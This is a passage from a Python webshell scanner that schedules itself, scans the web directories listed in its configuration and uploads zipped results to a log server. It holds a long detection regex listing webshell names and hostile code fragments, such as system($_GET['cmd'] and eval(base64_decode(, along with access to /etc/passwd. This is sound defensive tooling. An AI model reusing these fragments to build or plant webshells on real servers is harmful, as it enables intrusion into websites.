        config_handle = open(tool_path + "/config.conf", "r")
    elif platform.system() == "Windows":
        config_handle = open(tool_path + "\\config.conf", "r")
except:
    print("Cannot find config.conf file. Exit.")
    PressAnyKey()
    exit()

print("File config opened: " + tool_path + "/config.conf")

# Scheduling
if platform.system() == "Linux":
    LinuxScheduler(run_hour)
elif platform.system() == "Windows":
    WindowsScheduler(run_hour)

else:
    print('Unsupported OS. Exit.')
    PressAnyKey()
    exit()

# Make program run only at run_hour (for the first time running)
# current_time = datetime.datetime.now()
# if current_time.hour != run_hour:
#     print("The program will continue to run at " + str(run_hour) + ":00 pm today.")
#     PressAnyKey()
#     exit()

parser = configparser.ConfigParser()
parser.read(tool_path + "/config.conf")
try:
    scan_dir = parser.get("config", "dir")
except:
    print("No option 'dir'. Check [config].dir in config.conf")
    PressAnyKey()
    exit()
scan_dir = scan_dir.split(",")
for i in range(len(scan_dir)):
    scan_dir[i] = scan_dir[i].strip()

try:
    web_domain = parser.get("config", "domain")
except:
    print("No option 'domain'. Check [config].domain in config.conf")
    PressAnyKey()
    exit()
web_domain = web_domain.split(",")
for i in range(len(web_domain)):
    web_domain[i] = web_domain[i].strip()

# Check if [config].dir have the same items as [config].domain
if len(scan_dir) != len(web_domain):
    print("[config].dir doesn't have same items with [config].domain. Check again.")
    PressAnyKey()
    exit()

try:
    size = parser.get("config", "size")
except:
    print("No option 'size'. Check [config].size in config.conf")
    PressAnyKey()
    exit()
try:
    ext = parser.get("config", "ext")
except:
    print("No option 'ext'. Check [config].ext in config.conf")
    PressAnyKey()
    exit()

# Default size is 10 MB
if size == 0 or size == "":
    size = 10*1024*1024
else:
    size = int(size) * 1024 * 1024

# IMPORTANT!!! ALL REGEX ON THIS PROGRAM NEED TO USE NON-CAPTURING GROUP
regex = r"Filesman|(?:@\$_\[\]=|\$_=@\$_GET|\$_\[\+\"\"\]=)|eval\(\$(?:\w|\d)|Load\(Request\.BinaryRead\(int\.Parse\(Request\.Cookies|Html \= Replace\(Html\, \"\%26raquo\;\"\, \"?\"\)|pinkok|internal class reDuh|c0derz shell|md5 cracker|umer rock|Function CP\(S\,D\)\{sf\=CreateObject\(\"java\"\,\"java\.io\.File|Arguments\=xcmd\.text|asp cmd shell|Maceo|TEXTAREA id\=TEXTAREA1 name\=SqlQuery|CMD Bilgileri|sbusqlmod|php assert\(\$\_POST\[|oWshShellNet\.UserName|PHP C0nsole|rhtools|WinX Shell|system\(\$\_GET\[\'cmd\'|Successfully uploadet|\'Are you sure delete|sbusqlcmd|CFSWITCH EXPRESSION\=\#Form\.chopper|php\\HFile|\"ws\"\+\"cr\"\+\"ipt\.s\"\+\"hell\"|eval\(request\(|string rootkey|uZE Shell|Copyed success\!|InStr\(\"\$rar\$mdb\$zip\$exe\$com\$ico\$\"|Folder dosen\'t exists|Buradan Dosya Upload|echo passthru\(\$\_GET\[\'cmd\'|javascript:Bin\_PostBack|The file you want Downloadable|arguments\=\"/c \#cmd\#\"|cmdshell|AvFBP8k9CDlSP79lDl|AK-74 Security Team Web Shell|cfexecute name \= \"\#Form\.cmd\#\"|execute\(|Gamma Web Shell|System\.Reflection\.Assembly\.Load\(Request\.BinaryRead\(int\.Parse\(Request\.Cookies|fcreateshell|bash to execute a stack overflow|Safe Mode Shell|ASPX Shell|dingen\.php|azrailphp|\$\_POST\[\'sa\']\(\$\_POST\[\'sb\']\)|AspSpy|ntdaddy|\.HitU\. team|National Cracker Crew|eval\(base64\_decode\(\$\_REQUEST\[\'comment\'|Rootshell|geshi\\tsql\.php|tuifei\.asp|GRP WebShell|No Permission :\(|powered by zehir|will be delete all|WebFileManager Browsing|Dive Shell|diez\=server\.urlencode|@eval\(\$\_POST\[\'|ifupload\=\"ItsOk\"|eval\(request\.item|\(eval request\(|wsshn\.username|connect to reDuh|eval\(gzinflate\(base64\_decode|Ru24PostWebShell|ASPXTOOL\"|aspshell|File upload successfully you can download here|eval request\(|if\(is\_uploaded\_file\(\$HTTP|Sub RunSQLCMD|STNC WebShell|doosib|WinExec\(Target\_copy\_of\_cmd|php passthru\(getenv|win\.com cmd\.exe /c cacls\.exe|TUM HAKLARI SAKLIDIR|Created by PowerDream|Then Request\.Files\(0\)\.SaveAs\(Server\.MapPath\(Request|cfmshell|\{ Request\.Files\[0]\.SaveAs\(Server\.MapPath\(Request|\%execute\(request\(\"|php eval\(\$\_POST\[|lama\'s\'hell|RHTOOLS|data\=request\(\"dama\"|digitalapocalypse|hackingway\.tk|\.htaccess stealth web shell|strDat\.IndexOf\(\"EXEC \"|ExecuteGlobal request\(|Deleted file have finished|bin\_filern|CurrentVersionRunBackdoor|Chr\(124\)\.O\.Chr\(124\)|does not have permission to execute CMD\.EXE|G-Security Webshell|system\( \"\./findsock|configwizard|textarea style\=\"width:600\;height:200\" name\=\"cmd\"|ASPShell|repair/sam|BypasS Command eXecute|\%execute\(request\(|arguments\=\"/c \#hotmail|Coded by Loader|Call oS\.Run\(\"win\.com cmd\.exe|DESERTSUN SERVER CRASHER|ASPXSpy|cfparam name\=\"form\.shellpath\"|IIS Spy Using ADSI|p4ssw0rD|WARNING: Failed to daemonise|C0mmand line|phpinfo\(\) function has non-permissible|letaksekarang|Execute Shell Command|DXGLOBALSHIT|IISSpy|execute request\(|Chmod Ok\!|Upload Gagal|awen asp\.net|execute\(request\(\"|oSNet\.ComputerName|aspencodedll\.aspcoding|vbscript\.encode|exec\(|shell\_exec\(|popen\(|system\(|escapeshellcmd|passthru\(|pcntl\_exec|proc\_open|db\_connect|mysql\_query|execl\(|cmd\.exe|os\.popen|ls\ \-la|\/etc\/passwd|\/etc\/hosts|adodb\.connection|sqlcommandquery|shellexecute|oledbcommand|mime\-version|exif\_read\_data\(|gethostbyname\(|create\_function\(|base64\_decode\(|\-executionpolicy\ bypass"

# Check valid regex and ext
try:
    re.compile(ext)
    re.compile(regex)
except:
    print('Invalid extension input. Check [config].ext in config.conf')
    PressAnyKey()
    exit()

# Default scan all webshell extension
if ext == "":
    ext = r".php|.asp|.aspx|.sh|.bash|.zsh|.csh|.tsch|.pl|.py|.cgi|.cfm|.jsp|.htaccess|.ashx|.vbs|.ps1|.war|.js|.jar"

# Get all file list
file_list, file_list_all, scan_dir = GetAllFiles(scan_dir, size, ext)
print("Total file will scan: " + str(len(file_list_all)))

total = [0] * len(file_list)
matched = [0] * len(file_list)
cleared = [0] * len(file_list)

# Define output
os_name = platform.node()
user_name = getpass.getuser()
domain_name = socket.getfqdn()
ip_addr = socket.gethostbyname(socket.gethostname())
scan_time = str(datetime.datetime.today().strftime('%Y-%m-%d-%H-%M-%S'))

output_dir = tool_path + "/" + os_name + "_" + scan_time
os.mkdir(output_dir)
output_zip = "(" + domain_name + ")-(" + ip_addr + ")-(" + \
    scan_time + ")-(webshell)" + ".zip"

# Only scan if have file need to scan
if len(file_list_all) != 0:
    # Test open db
    db_json = TestDatabase()

    # Multi Threading
    lock = threading.Lock()
    i = psutil.cpu_count()  # NUM OF THREAD BASED ON NUM OF CPU ON SYSTEM
    if i == 1:
        i = 2

    # Split all file list into (num_of_thread-1) list.
    splited_list = list(SplitList(file_list_all, chunk_numbers=i-1))

    # Each thread using a sublist.
    CreateMultiThread()

# Write debug info to debug.json
WriteDebugInfo(total, matched, cleared, scan_dir,
               web_domain, total_scan_time, output_dir)

# Zip JSON output
ZipOutput()

# Save file to log server
SaveToLogServer()

# Delete local unnecessary file
DeleteTempFile()